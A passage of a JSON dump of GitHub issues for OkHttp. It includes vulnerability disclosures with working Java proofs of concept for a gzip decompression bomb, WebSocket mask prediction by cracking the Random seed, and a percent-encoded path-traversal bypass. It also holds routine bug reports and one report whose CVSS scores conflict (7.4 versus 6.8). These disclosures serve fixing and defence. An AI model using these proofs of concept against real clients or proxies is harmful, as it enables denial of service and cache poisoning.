deprecating `addUnsafeNonAscii()` in favor of a more specific `addNonAscii()` that validates everything except the character range\n3. Add documentation warning about the injection risk\n\n## References\n\n- [CWE-113: CRLF Injection in HTTP Headers](https://cwe.mitre.org/data/definitions/113.html)\n- [OWASP: HTTP Response Splitting](https://owasp.org/www-community/attacks/HTTP_Response_Splitting)\n- OkHttp Source: `Headers.kt:250-255`\n",
+        "url": "https://github.com/square/okhttp/issues/9474"
+    },
+    {
+        "id": 4578400614,
+        "number": 9473,
+        "title": "Gzip Decompression Bomb via Transparent Encoding in OkHttp",
+        "state": "closed",
+        "created_at": "2026-06-03T09:04:56Z",
+        "updated_at": "2026-06-03T11:40:36Z",
+        "closed_at": "2026-06-03T11:40:36Z",
+        "author": "sara11h",
+        "comments": 1,
+        "labels": [
+            "bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "## Vulnerability Information\n\n| Field | Value |\n|-------|-------|\n| **Product** | OkHttp |\n| **Vendor** | Square (Block, Inc.) |\n| **Version Affected** | <= 5.0.0-alpha.14 (parent-5.3.2) |\n| **Vulnerability Type** | CWE-409: Improper Handling of Highly Compressed Data |\n| **Severity** | Medium |\n| **CVSS 3.1 Score** | 6.5 |\n| **CVSS 3.1 Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H |\n\n## Summary\n\nOkHttp transparently adds `Accept-Encoding: gzip` to requests and decompresses responses with no limit on decompressed output size. A malicious server can respond with a gzip bomb—a small compressed payload that expands to gigabytes—causing Out-of-Memory (OOM) crashes on the client.\n\n## Affected Component\n\n**File:** `okhttp/src/commonJvmAndroid/kotlin/okhttp3/internal/http/BridgeInterceptor.kt`\n**Lines:** 94-111\n\n```kotlin\nif (transparentGzip &&\n    \"gzip\".equals(networkResponse.header(\"Content-Encoding\"), ignoreCase = true) &&\n    networkResponse.promisesBody()) {\n  val gzipSource = GzipSource(responseBody.source())\n  // contentLength is set to -1 (unknown), no max size enforced\n  responseBuilder.body(RealResponseBody(contentType, -1L, gzipSource.buffer()))\n}\n```\n\n## Root Cause Analysis\n\nWhen OkHttp adds `Accept-Encoding: gzip` transparently (i.e., the application did not set it manually), it wraps the response body in a `GzipSource` for automatic decompression. There is:\n\n1. No maximum decompressed size limit\n2. No ratio check (compressed-to-decompressed ratio)\n3. No configurable `maxDecompressedBodySize` parameter\n\nA gzip stream of ~100KB can decompress to 100MB+ of zeros, and with nested gzip layers, the expansion can be gigabytes from kilobytes.\n\n## Reproduction Steps\n\n### Prerequisites\n- Java 17+\n- OkHttp 5.0.0-alpha.14\n\n### Steps\n\n1. Create a gzip bomb (100KB compressed → 100MB decompressed):\n```java\nbyte[] gzipBomb = createGzipBomb(100 * 1024 * 1024);\n// Result: ~100KB of compressed data\n```\n\n2. Start a server returning the gzip bomb:\n```java\nServerSocket server = new ServerSocket(8080);\nSocket client = server.accept();\n// Read request, then respond:\n// Content-Encoding: gzip\n// Content-Length: <bomb size>\n// Body: <gzip bomb bytes>\n```\n\n3. OkHttp client fetches the URL:\n```java\nOkHttpClient client = new OkHttpClient.Builder().build();\nRequest request = new Request.Builder()\n    .url(\"http://127.0.0.1:8080/data\")\n    .build();\nResponse response = client.newCall(request).execute();\nbyte[] data = response.body().bytes(); // OOM crash\n```\n\n### Expected Result\nOkHttp should enforce a configurable maximum decompressed body size.\n\n### Actual Result\nThe entire decompressed payload is read into memory with no limit, causing OOM.\n\n## Proof of Concept\n\n### Full PoC Script (Java)\n\n```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.zip.*;\nimport okhttp3.*;\n\npublic class PocGzipBomb {\n    static volatile long bytesRead = 0;\n\n    public static void main(String[] args) throws Exception {\n        byte[] gzipBomb = createGzipBomb(100 * 1024 * 1024);\n        System.out.println(\"Bomb: \" + gzipBomb.length + \" bytes -> 100MB decompressed\");\n\n        ServerSocket serverSocket = new ServerSocket(0);\n        int port = serverSocket.getLocalPort();\n\n        new Thread(() -> {\n            try {\n                Socket client = serverSocket.accept();\n                BufferedReader reader = new BufferedReader(\n                    new InputStreamReader(client.getInputStream()));\n                String line;\n                while ((line = reader.readLine()) != null && !line.isEmpty()) {}\n                OutputStream out = client.getOutputStream();\n                out.write((\"HTTP/1.1 200 OK\\r\\nContent-Type: text/plain\\r\\n\" +\n                    \"Content-Encoding: gzip\\r\\nContent-Length: \" +\n                    gzipBomb.length + \"\\r\\n\\r\\n\").getBytes());\n                out.write(gzipBomb);\n                out.flush();\n                client.close();\n            } catch (Exception e) {}\n        }).start();\n\n        OkHttpClient client = new OkHttpClient.Builder().build();\n        Request request = new Request.Builder()\n            .url(\"http://127.0.0.1:\" + port + \"/data\").build();\n\n        Response response = client.newCall(request).execute();\n        InputStream is = response.body().byteStream();\n        byte[] buf = new byte[8192];\n        int read;\n        while ((read = is.read(buf)) != -1) { bytesRead += read; }\n        System.out.println(\"Decompressed: \" + (bytesRead / 1024 / 1024) + \" MB\");\n        // No size limit enforced\n        serverSocket.close();\n    }\n\n    static byte[] createGzipBomb(int size) throws IOException {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        GZIPOutputStream gzip = new GZIPOutputStream(baos);\n        byte[] zeros = new byte[8192];\n        int remaining = size;\n        while (remaining > 0) {\n            int w = Math.min(zeros.length, remaining);\n            gzip.write(zeros, 0, w);\n            remaining -= w;\n        }\n        gzip.close();\n        return baos.toByteArray();\n    }\n}\n```\n\n### PoC Output\n```\n[*] Gzip bomb created: 101941 bytes compressed -> 100MB decompressed\n[*] Malicious server listening on port 59048\n[*] Sending request to malicious server...\n[*] OkHttp will transparently decompress the gzip response with NO size limit\n[!] Decompressed so far: 100 MB\n[!] VULNERABILITY CONFIRMED: Total decompressed size = 100 MB from 101941 byte payload\n[!] No size limit was enforced by OkHttp\n```\n\n## Impact\n\n- **Confidentiality:** None\n- **Integrity:** None\n- **Availability:** High - Client application crashes with OOM, affecting all operations in the same process\n\n## CVSS 3.1 Calculation\n\n| Metric | Value | Justification |\n|--------|-------|---------------|\n| Attack Vector | Network | Malicious server response over network |\n| Attack Complexity | Low | Simple gzip bomb, trivial to construct |\n| Privileges Required | None | No auth required to send a response |\n| User Interaction | Required | Client must make request to attacker server |\n| Scope | Unchanged | Only client process affected |\n| Confidentiality | None | No data exposure |\n| Integrity | None | No data modification |\n| Availability | High | OOM crash of entire application |\n\n**CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H = 6.5**\n\n## Remediation Recommendations\n\n1. Add a configurable `maxDecompressedBodySize` parameter to `OkHttpClient.Builder` (default: 100MB)\n2. Implement ratio-based detection: abort if decompressed/compressed ratio exceeds threshold (e.g., 1000:1)\n3. Document the risk for applications fetching untrusted URLs\n\n## References\n\n- [CWE-409: Improper Handling of Highly Compressed Data](https://cwe.mitre.org/data/definitions/409.html)\n- [OWASP: Decompression Bomb](https://owasp.org/www-community/vulnerabilities/Decompression_Bomb)\n- OkHttp Source: `BridgeInterceptor.kt:94-111`\n",
+        "url": "https://github.com/square/okhttp/issues/9473"
+    },
+    {
+        "id": 4578318385,
+        "number": 9472,
+        "title": "Predictable WebSocket Masking Keys via java.util.Random in OkHttp",
+        "state": "closed",
+        "created_at": "2026-06-03T08:52:45Z",
+        "updated_at": "2026-06-03T11:53:48Z",
+        "closed_at": "2026-06-03T11:53:48Z",
+        "author": "sara11h",
+        "comments": 1,
+        "labels": [
+            "bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "## Vulnerability Information\n\n| Field | Value |\n|-------|-------|\n| **Product** | OkHttp |\n| **Vendor** | Square (Block, Inc.) |\n| **Version Affected** | <= 5.0.0-alpha.14 (parent-5.3.2) |\n| **Vulnerability Type** | CWE-330: Use of Insufficiently Random Values |\n| **Severity** | High |\n| **CVSS 3.1 Score** | 7.4 |\n| **CVSS 3.1 Vector** | CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:H/A:N |\n\n## Summary\n\nOkHttp uses `java.util.Random` (a 48-bit Linear Congruential Generator) instead of `java.security.SecureRandom` for generating WebSocket frame masking keys. RFC 6455 §10.3 explicitly requires that masking keys be unpredictable to prevent cache poisoning attacks through intermediary proxies. After observing one masked WebSocket frame, an attacker can recover the LCG seed and predict all future masking keys, defeating the masking mechanism entirely.\n\n## Affected Component\n\n**File:** `okhttp/src/commonJvmAndroid/kotlin/okhttp3/OkHttpClient.kt`\n**Line:** 365\n\n```kotlin\nrandom = Random(),  // java.util.Random — NOT SecureRandom\n```\n\n**File:** `okhttp/src/commonJvmAndroid/kotlin/okhttp3/internal/ws/WebSocketWriter.kt`\n**Line:** 133\n\n```kotlin\nrandom.nextBytes(maskKey!!)  // 4-byte mask from predictable PRNG\n```\n\n## Root Cause Analysis\n\n`java.util.Random` uses a 48-bit Linear Congruential Generator (LCG):\n```\nseed(n+1) = (seed(n) * 0x5DEECE66DL + 0xBL) & ((1L << 48) - 1)\nnextInt() = (int)(seed >>> 16)\n```\n\nThe `nextBytes()` method for a 4-byte masking key calls `nextInt()` once (returning bits 47:16 of the seed). After observing two consecutive masking keys (two `nextInt()` calls), an attacker can:\n\n1. Take the first output as the upper 32 bits of the 48-bit seed\n2. Brute-force the lower 16 bits (65,536 attempts)\n3. Verify against the second output\n4. Predict all subsequent outputs with certainty\n\nThis attack takes microseconds on modern hardware.\n\n## Attack Scenario\n\nPer RFC 6455 §10.3, unpredictable masking prevents cache poisoning:\n\n1. Attacker is positioned as a network intermediary (e.g., a caching proxy)\n2. Client connects to a WebSocket server through the proxy\n3. Attacker observes one masked frame (mask key visible in frame header)\n4. Attacker recovers the LCG seed and predicts future masking keys\n5. Attacker crafts a WebSocket frame whose masked bytes decode to a malicious HTTP response when XORed with the predicted mask\n6. This poisons the proxy's cache, serving malicious content to other users\n\n## Reproduction Steps\n\n### Prerequisites\n- Java 17+\n- OkHttp 5.0.0-alpha.14 source code\n\n### Source Code Verification\n\n1. Inspect `OkHttpClient.kt:365`:\n```kotlin\nrandom = Random(),  // java.util.Random, NOT SecureRandom\n```\n\n2. Inspect `WebSocketWriter.kt:133`:\n```kotlin\nrandom.nextBytes(maskKey!!)\n```\n\n3. Verify `Random` import is `java.util.Random`:\n```kotlin\nimport java.util.Random\n```\n\n### Cryptographic Proof\n\nGiven two consecutive 4-byte masks (8 bytes = 2 × nextInt()):\n```\nMask 1: 0xAABBCCDD → nextInt() output #1\nMask 2: 0xEEFF0011 → nextInt() output #2\n```\n\nSeed recovery:\n```java\nlong upperSeed1 = ((long)0xAABBCCDD) << 16;\nfor (long low = 0; low < 65536; low++) {\n    long seed = (upperSeed1 | low) & ((1L << 48) - 1);\n    long nextSeed = (seed * 0x5DEECE66DL + 0xBL) & ((1L << 48) - 1);\n    if ((int)(nextSeed >>> 16) == 0xEEFF0011) {\n        // Seed cracked! All future outputs predictable.\n        break;\n    }\n}\n```\n\n## Proof of Concept\n\n### Verification Script (Java)\n\n```java\nimport java.util.Random;\n\n/**\n * Demonstrates that java.util.Random seed can be recovered from 2 outputs,\n * proving WebSocket masking keys are predictable.\n */\npublic class PocPredictableMask {\n    public static void main(String[] args) {\n        // Simulate OkHttp's Random instance\n        Random okhttpRandom = new Random(); // Same as OkHttp uses\n\n        // Generate masking keys as OkHttp does\n        byte[] mask1 = new byte[4];\n        byte[] mask2 = new byte[4];\n        byte[] mask3 = new byte[4];\n        okhttpRandom.nextBytes(mask1);\n        okhttpRandom.nextBytes(mask2);\n        okhttpRandom.nextBytes(mask3); // To verify prediction\n\n        int v1 = bytesToInt(mask1);\n        int v2 = bytesToInt(mask2);\n        int v3 = bytesToInt(mask3);\n\n        System.out.println(\"Observed mask 1: 0x\" + Integer.toHexString(v1));\n        System.out.println(\"Observed mask 2: 0x\" + Integer.toHexString(v2));\n        System.out.println(\"Target mask 3:   0x\" + Integer.toHexString(v3));\n\n        // Crack the seed from v1 and v2\n        long upperSeed = ((long)v1 & 0xFFFFFFFFL) << 16;\n        for (long low = 0; low < 65536; low++) {\n            long seed = (upperSeed | low) & ((1L << 48) - 1);\n            long next = (seed * 0x5DEECE66DL + 0xBL) & ((1L << 48) - 1);\n            if ((int)(next >>> 16) == v2) {\n                // Predict mask 3\n                long next2 = (next * 0x5DEECE66DL + 0xBL) & ((1L << 48) - 1);\n                int predicted = (int)(next2 >>> 16);\n                System.out.println(\"\\nSeed cracked: 0x\" + Long.toHexString(seed));\n                System.out.println(\"Predicted mask 3: 0x\" + Integer.toHexString(predicted));\n                System.out.println(\"Match: \" + (predicted == v3));\n                break;\n            }\n        }\n    }\n\n    static int bytesToInt(byte[] b) {\n        return ((b[0] & 0xFF) << 24) | ((b[1] & 0xFF) << 16) |\n               ((b[2] & 0xFF) << 8) | (b[3] & 0xFF);\n    }\n}\n```\n\n### Source Code Evidence\n\n```\n$ grep -n \"random = Random()\" okhttp/src/commonJvmAndroid/kotlin/okhttp3/OkHttpClient.kt\n365:        random = Random(),\n```\n\nThis confirms `java.util.Random` (not `SecureRandom`) is used for WebSocket masking.\n\n## Impact\n\n- **Confidentiality:** None directly\n- **Integrity:** High - Cache poisoning via predictable masks allows serving attacker-controlled content to victims through caching proxies\n- **Availability:** None\n- **Scope:** Changed - Attack through the client affects other users of the same proxy/cache\n\n## CVSS 3.1 Calculation\n\n| Metric | Value | Justification |\n|--------|-------|---------------|\n| Attack Vector | Network | Attacker observes frames on network path |\n| Attack Complexity | High | Requires intermediary position + caching proxy |\n| Privileges Required | None | Passive observation + frame injection |\n| User Interaction | None | Automatic once positioned |\n| Scope | Changed | Other users served poisoned cache entries |\n| Confidentiality | None | No direct data exposure |\n| Integrity | High | Arbitrary cache poisoning |\n| Availability | None | No DoS |\n\n**CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:H/A:N = 6.8**\n\n## Remediation Recommendations\n\n1. Replace `Random()` with `SecureRandom()` in `OkHttpClient.kt:365`\n2. This is a one-line fix with negligible performance impact (WebSocket frame rate is far below SecureRandom throughput limits)\n\n## References\n\n- [CWE-330: Use of Insufficiently Random Values](https://cwe.mitre.org/data/definitions/330.html)\n- [RFC 6455 §10.3: Attacks On Infrastructure (Masking)](https://datatracker.ietf.org/doc/html/rfc6455#section-10.3)\n- [Breaking java.util.Random](https://franklinta.com/2014/08/31/predicting-the-next-math-random-in-java/)\n- OkHttp Source: `OkHttpClient.kt:365`, `WebSocketWriter.kt:133`",
+        "url": "https://github.com/square/okhttp/issues/9472"
+    },
+    {
+        "id": 4571965648,
+        "number": 9469,
+        "title": "IllegalArgumentException: port out of range:-1 from DefaultProxySelector.select() propagates uncaught through RouteSelector.resetNextProxy",
+        "state": "closed",
+        "created_at": "2026-06-02T13:46:13Z",
+        "updated_at": "2026-06-09T02:08:56Z",
+        "closed_at": "2026-06-09T02:08:56Z",
+        "author": "MatellioManish",
+        "comments": 0,
+        "labels": [
+            "bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "**OkHttp version**: 5.3.2\n**Platform**: Android 13 (API 33), ARM64\n\n**Summary**\n  \n  On Android devices where a proxy is configured (via APN settings or MDM) but the port field is left unset, DefaultProxySelector.select() throws IllegalArgumentException: port out of \n  range:-1 internally before it returns. This unchecked exception propagates through RouteSelector.selectProxies() uncaught, crashing the app. This is a fatal crash on the OkHttp Dispatcher\n  thread.\n\n  ---\n  **Stack trace**\n\n  Fatal Exception: java.lang.IllegalArgumentException: port out of range:-1\n    at java.net.InetSocketAddress.checkPort(InetSocketAddress.java:144)\n    at java.net.InetSocketAddress.createUnresolved(InetSocketAddress.java:269)\n    at sun.net.spi.DefaultProxySelector$1.run(DefaultProxySelector.java:315)\n    at sun.net.spi.DefaultProxySelector$1.run(DefaultProxySelector.java:219)\n    at java.security.AccessController.doPrivileged(AccessController.java:43)\n    at sun.net.spi.DefaultProxySelector.select(DefaultProxySelector.java:218)\n    at okhttp3.internal.connection.RouteSelector.resetNextProxy$selectProxies(RouteSelector.kt:108)\n    at okhttp3.internal.connection.RouteSelector.resetNextProxy(RouteSelector.kt:115)\n    at okhttp3.internal.connection.RouteSelector.<init>(RouteSelector.kt:52)\n    at okhttp3.internal.connection.RealRoutePlanner.planConnect$okhttp(RealRoutePlanner.kt:153)\n    at okhttp3.internal.connection.RealRoutePlanner.plan(RealRoutePlanner.kt:75)\n    at okhttp3.internal.connection.FastFallbackExchangeFinder.launchTcpConnect(FastFallbackExchangeFinder.kt:119)\n    at okhttp3.internal.connection.FastFallbackExchangeFinder.find(FastFallbackExchangeFinder.kt:62)\n    at okhttp3.internal.connection.RealCall.initExchange$okhttp(RealCall.kt:298)\n    at okhttp3.internal.connection.ConnectInterceptor.intercept(ConnectInterceptor.kt:32)\n    ...\n\n  ---\n",
+        "url": "https://github.com/square/okhttp/issues/9469"
+    },
+    {
+        "id": 4534508337,
+        "number": 9462,
+        "title": "Class.forName(Jdk9Platform) throws during warm up",
+        "state": "open",
+        "created_at": "2026-05-27T17:49:36Z",
+        "updated_at": "2026-05-27T17:49:36Z",
+        "closed_at": null,
+        "author": "xiaoyicao-ctrl",
+        "comments": 0,
+        "labels": [
+            "bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "When we try to warm up our Java binary by invoking `Class.forName` to pre-load all the classes we use, `okhttp3.internal.platform.Jdk9Platform` throws an `ExceptionInInitializerError` exception. \n\nThe root cause is that there is a cyclic initialization between `Jdk9Platform` and its parent `Platform`:\n\nInitialize `Jdk9Platform` > Initialize `Platform` > Initialize `Platform.Companion` > eventually calls `Jdk9Platform.buildIfSupported()` > at this point, the companion object of `Jdk9Platform` has not been initialized yet.\n\nOne possible way to solve this is to make `Platform.platform` lazy (does not call `getPlatform()` immediately).\n\nTest:\n\n```java\nimport org.junit.Test;\n\npublic class OkHttpBug {\n  @Test\n  public void testFailure() throws Exception {\n    Class.forName(\"okhttp3.internal.platform.Jdk9Platform\");\n\n    // Expected Behavior:\n    // The class okhttp3.internal.platform.Jdk9Platform should be loaded successfully without\n    // throwing any exceptions.\n    //\n    // Actual Failure:\n    // java.lang.ExceptionInInitializerError\n    //     ...\n    // Caused by: java.lang.NullPointerException: Cannot invoke\n    // \"okhttp3.internal.platform.Jdk9Platform$Companion.buildIfSupported()\" because\n    // \"okhttp3.internal.platform.Jdk9Platform.Companion\" is null\n\n    System.out.println(\"Loaded Jdk9Platform successfully.\");\n  }\n}\n```",
+        "url": "https://github.com/square/okhttp/issues/9462"
+    },
+    {
+        "id": 4511741530,
+        "number": 9451,
+        "title": "HttpUrl.isDotDot misses '..%2e' and '%2e..' forms — path-traversal sandbox bypass",
+        "state": "closed",
+        "created_at": "2026-05-24T13:26:43Z",
+        "updated_at": "2026-06-05T22:09:00Z",
+        "closed_at": "2026-06-05T01:34:06Z",
+        "author": "zhangjiashuo-cs",
+        "comments": 2,
+        "labels": [],
+        "assignees": [],
+        "locked": false,
+        "body": "### Description\n\n`HttpUrl.Builder`'s `isDotDot()` matcher recognizes some percent-encoded forms of `\"..\"` (`%2e.`, `.%2e`, `%2e%2e`) but **misses two more**: `..%2e` and `%2e..`. These extra forms therefore are **not normalized away** during URL resolution, even though they decode to exactly the same dot-dot segment.\n\nThis can cause path-traversal sandbox checks built on top of `HttpUrl.resolve(...).encodedPath()` to be bypassed.\n\n### Reproducer (okhttp 4.12.0)\n\n```java\nimport okhttp3.HttpUrl;\n\nHttpUrl base = HttpUrl.parse(\"http://example.com/static/\");\n\n// Forms that are correctly normalized (path collapses to \"/\"):\nbase.resolve(\"..\");        //  -> http://example.com/         path=/\nbase.resolve(\"%2e%2e\");    //  -> http://example.com/         path=/\nbase.resolve(\".%2e\");      //  -> http://example.com/         path=/\nbase.resolve(\"%2e.\");      //  -> http://example.com/         path=/\n\n// Forms that are NOT recognized — left in the path literally:\nbase.resolve(\"..%2e\");     //  -> http://example.com/static/..%2e   path=/static/..%2e\nbase.resolve(\"%2e..\");     //  -> http://example.com/static/%2e..   path=/static/%2e..\nbase.resolve(\"..%2E\");     //  -> http://example.com/static/..%2E   path=/static/..%2E\n```\n\n### Root cause\n\n`HttpUrl.kt` lines 1455-1460:\n\n```kotlin\nprivate fun isDotDot(input: String): Boolean {\n  return input == \"..\" ||\n      input.equals(\"%2e.\", ignoreCase = true) ||\n      input.equals(\".%2e\", ignoreCase = true) ||\n      input.equals(\"%2e%2e\", ignoreCase = true)\n}\n```\n\nThe enumeration covers 4 forms but not `..%2e` or `%2e..` (i.e. one literal dot followed by an encoded dot, then itself).\n\n### Threat model\n\nCode that uses `HttpUrl.resolve()` to compute the absolute form of a user-supplied path and then validates the resulting `encodedPath()` against a prefix (e.g. `\"/static/\"`) is bypassed:\n\n```kotlin\nval resolved = base.resolve(userInput)\nrequire(resolved.encodedPath().startsWith(\"/static/\"))      // passes for \"..%2e\"\n// later: read file at resolved.encodedPath()\n//   /static/..%2e   →  on most filesystems, %2e is decoded → /static/../  → traversal\n```\n\nMany HTTP servers and file-serving libraries do percent-decode `%2e` later in the pipeline, so the bypass becomes a path traversal in practice. URL specs (RFC 3986 §6.2.2.3) treat `..%2e` and `%2e..` as equivalent to `..`.\n\n### Suggested fix\n\n```diff\n private fun isDotDot(input: String): Boolean {\n   return input == \"..\" ||\n       input.equals(\"%2e.\", ignoreCase = true) ||\n       input.equals(\".%2e\", ignoreCase = true) ||\n-      input.equals(\"%2e%2e\", ignoreCase = true)\n+      input.equals(\"%2e%2e\", ignoreCase = true) ||\n+      input.equals(\"..%2e\", ignoreCase = true) ||\n+      input.equals(\"%2e..\", ignoreCase = true)\n }\n```\n\n(Two new branches; same `ignoreCase` semantics already used for the others.)\n\n### Environment\n\n- okhttp: 4.12.0 (also expected on 5.x; the matcher is unchanged in `okhttp/src/main/kotlin/okhttp3/HttpUrl.kt`)\n\nDiscovered via jqwik property-based testing while fuzzing the URL-resolution invariant `path-normalization(resolve(x)) is canonical`.",
+        "url": "https://github.com/square/okhttp/issues/9451"
+    },
+    {
+        "id": 4496469121,
+        "number": 9445,
+        "title": "🙉",
+        "state": "closed",
+        "created_at": "2026-05-21T17:02:35Z",
+        "updated_at": "2026-05-21T17:45:37Z",
+        "closed_at": "2026-05-21T17:45:36Z",
+        "author": "dayanmasiha-hub",
+        "comments": 0,
+        "labels": [],
+        "assignees": [],
+        "locked": false,
+        "body": "🛑 𝙎𝙏𝙊𝙋\n\nThis issue tracker is not the place for questions!\n\nIf you want to ask how to do something, or to understand why something isn't working the way you expect it to, use Stack Overflow. https://stackoverflow.com/questions/tagged/okhttp\n\nWe close all questions without reading them.\n",
+        "url": "https://github.com/square/okhttp/issues/9445"
+    },
+    {
+        "id": 4449596450,
+        "number": 9443,
+        "title": "Dispatcher Javadoc understates the executor requirement (\"should be able to run maxRequests concurrently\" is necessary but not sufficient)",
+        "state": "open",
+        "created_at": "2026-05-14T21:56:34Z",
+        "updated_at": "2026-05-14T21:56:34Z",
+        "closed_at": null,
+        "author": "theJC",
+        "comments": 0,
+        "labels": [],
+        "assignees": [],
+        "locked": false,
+        "body": "The `Dispatcher` class doc currently states:\n\n> Each dispatcher uses an `ExecutorService` to run calls internally. If you supply your own executor, it should be able to run [the configured maximum][maxRequests] number of calls concurrently.\n\n— `Dispatcher.kt`, lines 32–35 on master (`74428398`)\n\nThis phrasing implies that an executor sized to `maxRequests` (e.g. `ThreadPoolExecutor(core=N, max=N, SynchronousQueue)` with `dispatcher.setMaxRequests(N)`) is sufficient. It isn't. Such an executor will reject submissions with `RejectedExecutionException` — surfaced to callers as `InterruptedIOException(\"executor rejected\")` — under sustained traffic that approaches `maxRequests`.\n\n### Why\n\nWhen a worker thread finishes a call, it runs `Dispatcher.finished()` → `promoteAndExecute()` synchronously on its way back to `queue.take()`. The synchronized block selects calls to promote and builds `callsToExecute`; the actual `executor.execute(...)` happens *outside* the lock (`Dispatcher.kt:236–251`). At the moment of the submit, the finishing worker thread is itself still a pool slot, but is not yet in `take()`. With `SynchronousQueue` + `core == max == N`, there is no waiting consumer and no room to grow the pool, so the offer fails. With multiple near-simultaneous completions, multiple worker threads can be in this state at once; up to `maxRequests` rejections are possible per burst.\n\n### Evidence in this repo\n\nThe default executor at `Dispatcher.kt:96–104` is `ThreadPoolExecutor(0, Int.MAX_VALUE, 60, TimeUnit.SECONDS, SynchronousQueue(), ...)`. If the doc's stated requirement were sufficient, the default would be `(maxRequests, maxRequests, ...)`. Instead, `maxPoolSize=Int.MAX_VALUE` is used precisely to absorb the transient-submit race described above.\n\n### Suggested wording\n\n> Each dispatcher uses an `ExecutorService` to run calls internally. If you supply your own executor, it must accept any new task at any time while up to [the configured maximum][maxRequests] calls are already running. A pool sized exactly to `maxRequests` is **not** sufficient when paired with `SynchronousQueue`, because the dispatcher submits the next promoted call from a worker thread that has not yet returned to the queue; the offer will fail and the call will surface `InterruptedIOException(\"executor rejected\")`. Match the pattern used by the default executor (`corePoolSize=0, maxPoolSize=Int.MAX_VALUE, SynchronousQueue`), or bound the maximum at `2 × maxRequests`, or use a queueing executor.\n\n### Referenced prior work\n\n#4365 introduced the `executor rejected` failure path; this issue is about the documentation that leads users into the trap that PR is designed to surface.",
+        "url": "https://github.com/square/okhttp/issues/9443"
+    },
+    {
+        "id": 4430220522,
+        "number": 9440,
+        "title": "Create `mockwebserver3-junit6`",
+        "state": "closed",
+        "created_at": "2026-05-12T14:59:56Z",
+        "updated_at": "2026-06-08T22:37:59Z",
+        "closed_at": "2026-05-25T15:00:25Z",
+        "author": "Thunderforge",
+        "comments": 3,
+        "labels": [
+            "enhancement"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "JUnit 6 has now been released. There is \n\n* [mockwebserver](https://mvnrepository.com/artifact/com.squareup.okhttp3/mockwebserver) (uses JUnit 4)\n* [mockwebserver3-junit4](https://mvnrepository.com/artifact/com.squareup.okhttp3/mockwebserver3-junit4)\n* [mockwebserver3-junit5](https://mvnrepository.com/artifact/com.squareup.okhttp3/mockwebserver3-junit5)\n\nWe are wanting to use JUnit 6. So it seems to me that we would need a corresponding `mockwebserver3-junit6`. If that could be released for those like us using it, we would appreciate it.",
+        "url": "https://github.com/square/okhttp/issues/9440"
+    },
+    {
+        "id": 4425754809,
+        "number": 9439,
+        "title": "[Security] 21 findings: unencrypted sockets, hardcoded keys, weak SSL",
+        "state": "closed",
+        "created_at": "2026-05-12T02:39:06Z",
+        "updated_at": "2026-05-12T02:45:08Z",
+        "closed_at": "2026-05-12T02:43:41Z",
+        "author": "airdropp20208-star",
+        "comments": 1,
+        "labels": [],
+        "assignees": [],
+        "locked": false,
+        "body": "## Summary\nAutomated static analysis of okhttp with semgrep 1.162.0 + gitleaks found 21 security issues.\n\n### 1. Unencrypted Sockets (6 findings)\nPlaintext ServerSocket usage in multiple files. Attacker on same network can intercept traffic.\n**Files:** MockWebServer, okhttp-testing-support, okhttp/src\n\n### 2. Hardcoded Private Keys (10 findings)\nPrivate key material in docs and test files. While test keys, they expose sensitive patterns.\n**Files:** docs/changelogs, okhttp-tls/README.md, okhttp-tls/src/main/kotlin\n\n### 3. Weak SSL Context (2 findings)\nTLSv1 usage detected. Should migrate to TLSv1.2+.\n**Autofix available:** \n\n### Recommendation\n- Replace unencrypted sockets with SSLSocketFactory\n- Move test keys to environment variables\n- Upgrade weak SSL contexts\n\n### Environment\nsemgrep 1.162.0 + gitleaks 8.x on proot-distro Ubuntu 25.10",
+        "url": "https://github.com/square/okhttp/issues/9439"
+    },
+    {
+        "id": 4397145208,
+        "number": 9438,
+        "title": "test issue",
+        "state": "closed",
+        "created_at": "2026-05-07T08:05:22Z",
+        "updated_at": "2026-05-07T08:11:03Z",
+        "closed_at": "2026-05-07T08:11:03Z",
+        "author": "admln",
+        "comments": 0,
+        "labels": [
+            "bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "[test](http://129.204.60.31/)",
+        "url": "https://github.com/square/okhttp/issues/9438"
+    }
+]
